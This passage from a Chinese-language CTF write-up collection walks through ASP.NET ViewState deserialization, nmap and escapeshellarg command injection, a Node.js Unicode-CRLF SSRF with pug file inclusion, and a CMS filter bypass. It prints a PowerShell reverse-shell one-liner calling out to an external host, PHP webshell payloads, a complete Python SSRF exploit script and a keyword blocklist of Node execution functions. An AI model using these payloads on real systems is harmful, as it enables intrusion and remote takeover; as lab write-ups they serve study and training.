                if (blacklists.Any(extension.Contains)) {
                    Label1.Text = "What do you do?";
                } else {
                    String ip = context.Request.ServerVariables["REMOTE_ADDR"];
                    String upload_base = Server.MapPath("/") + "files/" + ip + "/";
                    if (!System.IO.Directory.Exists(upload_base)) {
                        System.IO.Directory.CreateDirectory(upload_base);
                    }

                    filename = Guid.NewGuid() + extension;
                    FileUpload1.SaveAs(upload_base + filename);

                    Label1.Text = String.Format("<a href='files/{0}/{1}'>This is file</a>", ip, filename);
                }
            }
            catch (Exception ex)
            {
                Label1.Text = "ERROR: " + ex.Message.ToString();
            }
        } else {
            Label1.Text = "You have not specified a file.";
        }
    }
  protected void Button2_Click(object sender, EventArgs e) {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c reverse.lvm.me -p 6666 -e cmd");
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);
            ViewState["test"] = set;
    }
</script>

<!DOCTYPE html>
<html>
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="stylesheet" type="text/css" href="bootstrap.min.css">
    <title>Why so Serials?</title>
</head>
<body>
  <div class="container">
    <div class="jumbotron" style='background: #f7f7f7'>
        <h1>Why so Serials?</h1>
        <p>May the <b><a href='Default.aspx.txt'>source</a></b> be with you!</p>
        <br />
        <form id="form1" runat="server">
            <div class="input-group">
                <asp:FileUpload ID="FileUpload1" runat="server" class="form-control"/>
                <span class="input-group-btn">
                    <asp:Button ID="Button1" runat="server" OnClick="Button1_Click"
                 Text="GO" class="btn"/>
                  <asp:Button ID="Button2" runat="server" OnClick="Button2_Click" 
                    Text="TEST" class="btn"/>
                </span>
            </div>
            <br />
            <br />
            <br />
            <div class="alert alert-primary text-center">
                <asp:Label ID="Label1" runat="server"></asp:Label>
            </div>
        </form>
    </div>
  </div>
</body>
</html>
```

这里用到了一些asp开发知识。但我们重点关注这一句

```
 set.Add("/c " + "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c reverse.lvm.me -p 6666 -e cmd");
```

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd
```

这句是powershell反弹shell的标准语句。[powershell 反弹shell](https://www.cnblogs.com/-mo-/p/11487997.html)

其中的powercat是netcat的powershell版本，我们尝试下载它。下载就需要System.Net.Webclient的支持。

使用viewgen生成payload的话，要注意  需要把machineKey和validationKey的k变成大写的，不然程序会报错

```
./viewgen --webconfig web.config -m CA0B0334 -c "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 122.51.141.127 -p 6666 -e cmd" > exp
```

正常反弹shell这样就行了，但是这里使用了签名算法来验证viewstate，我们只能自己搭建IIS服务器，生成这个viewstate和对应的签名。

[IIS的搭建教程](https://blog.csdn.net/qq_36348823/article/details/81367819)

## [网鼎杯 2020 朱雀组]Nmap

nmap命令注入，nmap有一个参数`-oG`可以输出到文件中

```
-oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3, and Grepable format, respectively, to the given filename.
```

fuzz发现过滤，考虑绕过后输入

```
' <?= @eval($_POST["hack"]);?> -oG hack.phtml '
```

写入webshell，包含即可，根目录获得flag

```
flag{3b2f5fa1-30d6-4de8-b2ba-67440e0a9284}
```

## [BUUCTF 2018]Online Tool

和上一题是相近的知识点。

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

还涉及到一个转义连用漏洞问题：是由于后者仅转义不配对引号所导致。

[PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)

```
escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数
escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。

escapeshellcmd — shell 元字符转义
escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$\, \x0A 和 \xFF。 ' 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
```

> 1. curl $args ，传入的参数是：`172.17.0.2' -v -d a=1`
> 2. 经过`escapeshellarg`处理后变成了`'172.17.0.2'\'' -v -d a=1'`，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
> 3. 经过`escapeshellcmd`处理后变成`'172.17.0.2'\\'' -v -d a=1\'`，这是因为`escapeshellcmd`对`\`以及最后那个**不配对儿**的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
> 4. 最后执行的命令是`curl '172.17.0.2'\\'' -v -d a=1\'`，由于中间的`\\`被解释为`\`而不再是转义字符，所以后面的`'`没有被转义，与再后面的`'`配对儿成了一个空白连接符。所以可以简化为`curl 172.17.0.2\ -v -d a=1'`，即向`172.17.0.2\`发起请求，POST 数据为`a=1'`。

尝试一下

```
输入的host是  'asd'
命令结果  nmap -T5 -sT -Pn --host-timeout 2 -F ''\\''asd'\\'''
第一步escapeshellarg: ''\''asd'\'''，原理是这样 1.''   2.\'   3.'asd'  4.\'   5.''
第二步escapeshellcmd: ''\\''asd'\\'''
在shell中相当于 ''  \ ''  asd  '\'  ''
```

把沙盒位置获取后就可以命令注入了。

```
9b68bb95b66b273c20218ccd125dab22
' <?= @eval($_POST["hack"]);?> -oG hack.php '
flag{c177c3ed-9104-4383-afc4-f77c245cc039}
```

## [GYCTF2020]Node Game

source  注意：题目也特别强调了 Node 版本为 8.12.0

```js
var express = require('express');
var app = express();
var fs = require('fs');
var path = require('path');
var http = require('http');
var pug = require('pug');
var morgan = require('morgan');
const multer = require('multer');


app.use(multer({dest: './dist'}).array('file'));
app.use(morgan('short'));
app.use("/uploads",express.static(path.join(__dirname, '/uploads')))
app.use("/template",express.static(path.join(__dirname, '/template')))


app.get('/', function(req, res) {
    var action = req.query.action?req.query.action:"index";
    if( action.includes("/") || action.includes("\\") ){
        res.send("Errrrr, You have been Blocked");
    }
    file = path.join(__dirname + '/template/'+ action +'.pug');
    var html = pug.renderFile(file);
    res.send(html);
});

app.post('/file_upload', function(req, res){
    var ip = req.connection.remoteAddress;
    var obj = {
        msg: '',
    }
    if (!ip.includes('127.0.0.1')) {
        obj.msg="only admin's ip can use it"
        res.send(JSON.stringify(obj));
        return 
    }
    fs.readFile(req.files[0].path, function(err, data){
        if(err){
            obj.msg = 'upload failed';
            res.send(JSON.stringify(obj));
        }else{
            var file_path = '/uploads/' + req.files[0].mimetype +"/";
            var file_name = req.files[0].originalname
            var dir_file = __dirname + file_path + file_name
            if(!fs.existsSync(__dirname + file_path)){
                try {
                    fs.mkdirSync(__dirname + file_path)
                } catch (error) {
                    obj.msg = "file type error";
                    res.send(JSON.stringify(obj));
                    return
                }
            }
            try {
                fs.writeFileSync(dir_file,data)
                obj = {
                    msg: 'upload success',
                    filename: file_path + file_name
                } 
            } catch (error) {
                obj.msg = 'upload failed';
            }
            res.send(JSON.stringify(obj));    
        }
    })
})

app.get('/source', function(req, res) {
    res.sendFile(path.join(__dirname + '/template/source.txt'));
});

app.get('/core', function(req, res) {
    var q = req.query.q;
    var resp = "";
    if (q) {
        var url = 'http://localhost:8081/source?' + q
        console.log(url)
        var trigger = blacklist(url);
        if (trigger === true) {
            res.send("<p>error occurs!</p>");
        } else {
            try {
                http.get(url, function(resp) {
                    resp.setEncoding('utf8');
                    resp.on('error', function(err) {
                    if (err.code === "ECONNRESET") {
                     console.log("Timeout occurs");
                     return;
                    }
                   });

                    resp.on('data', function(chunk) {
                        try {
                         resps = chunk.toString();
                         res.send(resps);
                        }catch (e) {
                           res.send(e.message);
                        }
 
                    }).on('error', (e) => {
                         res.send(e.message);});
                });
            } catch (error) {
                console.log(error);
            }
        }
    } else {
        res.send("search param 'q' missing!");
    }
})

function blacklist(url) {
    var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
    var arrayLen = evilwords.length;
    for (var i = 0; i < arrayLen; i++) {
        const trigger = url.includes(evilwords[i]);
        if (trigger === true) {
            return true
        }
    }
}

var server = app.listen(8081, function() {
    var host = server.address().address
    var port = server.address().port
    console.log("Example app listening at http://%s:%s", host, port)
})
```

知识点：

Node的Unicode处理不当引起的HTTP注入，引发SSRF

https://xz.aliyun.com/t/2894#toc-0

https://github.com/nodejs/node/issues/13296

利用PUG模板进行文件包含

https://pugjs.org/zh-cn/language/includes.html

题目就利用了q参数进行SSRF，上传文件来文件包含。

特别要注意 Content-Type 要改，还有上面的 Connection 必须改为 Keep-Alive，这样才能几个请求一起夹带进去。发送一下，然后把右边的 HTTP 包内容拷贝上。脚本如下

```python
import urllib.parse
import requests

payload = ''' HTTP/1.1
Host: x
Connection: keep-alive

POST /file_upload HTTP/1.1
Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810
Connection: keep-alive
cache-control: no-cache
Host: x
Content-Length: 292

----------------------------919695033422425209299810
Content-Disposition: form-data; name="file"; filename="eli0t.pug"
Content-Type: /../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt

----------------------------919695033422425209299810--

GET /flag HTTP/1.1
Host: x
Connection: close
x:'''
payload = payload.replace("\n", "\r\n")
payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
print(payload)
r = requests.get('http://fbc4ecae-bc69-4cfd-8b3a-15cc50bae71c.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))
print(r.text)
```

看到payload最后长这个样子，我们尝试分析一下这行代码

`payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)`

```
＠ｈｔｔｐＯＱＮＱ－＊ｈｯｳｴＺ＠ｸ－＊ｃｯｮｮ･｣ｴｩｯｮＺ＠ｫ･･ｰＭ｡ｬｩｶ･－＊－＊ｐｏｓｔ＠Ｏｦｩｬ･｟ｵｰｬｯ｡､＠ｈｔｔｐＯＱＮＱ－＊ｃｯｮｴ･ｮｴＭｔｹｰ･Ｚ＠ｭｵｬｴｩｰ｡ｲｴＯｦｯｲｭＭ､｡ｴ｡［＠｢ｯｵｮ､｡ｲｹ］ＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＹＱＹＶＹＵＰＳＳＴＲＲＴＲＵＲＰＹＲＹＹＸＱＰ－＊ｃｯｮｮ･｣ｴｩｯｮＺ＠ｫ･･ｰＭ｡ｬｩｶ･－＊｣｡｣ｨ･Ｍ｣ｯｮｴｲｯｬＺ＠ｮｯＭ｣｡｣ｨ･－＊ｈｯｳｴＺ＠ｸ－＊ｃｯｮｴ･ｮｴＭｌ･ｮｧｴｨＺ＠ＲＹＲ－＊－＊ＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＹＱＹＶＹＵＰＳＳＴＲＲＴＲＵＲＰＹＲＹＹＸＱＰ－＊ｃｯｮｴ･ｮｴＭｄｩｳｰｯｳｩｴｩｯｮＺ＠ｦｯｲｭＭ､｡ｴ｡［＠ｮ｡ｭ･］Ｂｦｩｬ･Ｂ［＠ｦｩｬ･ｮ｡ｭ･］Ｂ･ｬｩＰｴＮｰｵｧＢ－＊ｃｯｮｴ･ｮｴＭｔｹｰ･Ｚ＠ＯＮＮＯｴ･ｭｰｬ｡ｴ･－＊－＊､ｯ｣ｴｹｰ･＠ｨｴｭｬ－＊ｨｴｭｬ－＊＠＠ｨ･｡､－＊＠＠＠＠ｳｴｹｬ･－＊＠＠＠＠＠＠ｩｮ｣ｬｵ､･＠ＮＮＯＮＮＯＮＮＯＮＮＯＮＮＯＮＮＯＮＮＯｦｬ｡ｧＮｴｸｴ－＊－＊ＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＹＱＹＶＹＵＰＳＳＴＲＲＴＲＵＲＰＹＲＹＹＸＱＰＭＭ－＊－＊ｇｅｔ＠Ｏｦｬ｡ｧ＠ｈｔｔｐＯＱＮＱ－＊ｈｯｳｴＺ＠ｸ－＊ｃｯｮｮ･｣ｴｩｯｮＺ＠｣ｬｯｳ･－＊ｸＺ
```

查阅一些资料可以发现规律，字符转换仅仅保留了字符的最后两位字节。所以脚本中只是在字符前面加了0xff而已。

```
#Buffer.from('http://example.com/\u{010D}\u{010A}/test', 'latin1').toString() 
#Unicode čĊ will convert to latin1 which will only pick up the right most byte
SPACE=u'\u0120'.encode('utf-8')
CRLF=u'\u010d\u010a'.encode('utf-8')  # transfer from unicode to utf-8 (\uxxxx is unicode's pattern)
SLASH=u'\u012f'.encode('utf-8')

注意space、crlf的编码
```

## [N1CTF 2018]eating_cms

fuzz出register.php注册进入

黑盒测试，发现url的page参数对应的是php文件。于是伪协议包含一下

```php
user.php?page=php://filter/convert.base64-encode/resource=user
```

![09DHvF.png](https://s1.ax1x.com/2020/09/25/09DHvF.png)

审计代码，发现有一个flag文件，直接包含会被WAF，然而WAF中是这样过滤的

```php
function filter_directory_guest()
{
    $keywords = ["flag","manage","ffffllllaaaaggg","info"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}
```

于是可以用一些函数解析不出的方法绕过，比如

```
//user.php?...
```

然后获得flag和manage，并且发现了一个upload。

```php
 m4aaannngggeee 这里是真正的上传点
 
 <?php
$allowtype = array("gif","png","jpg");
$size = 10000000;
$path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";
$filename = $_FILES['file']['name'];
if(is_uploaded_file($_FILES['file']['tmp_name'])){
    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
        die("error:can not move");
    }
}else{
    die("error:not an upload file！");
}
$newfile = $path.$filename;
echo "file upload success<br />";
echo $filename;
$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
echo "<img src='data:image/png;base64,".$picdata."'></img>";
if($_FILES['file']['error']>0){
    unlink($newfile);
    die("Upload file error: ");
}
$ext = array_pop(explode(".",$_FILES['file']['name']));
if(!in_array($ext,$allowtype)){
    unlink($newfile);
}
?>
```

这里直接命令注入，就可以发现flag

[parse_url解析漏洞](https://www.cnblogs.com/Lee-404/p/12826352.html)

## [watevrCTF-2019]Pickle Store

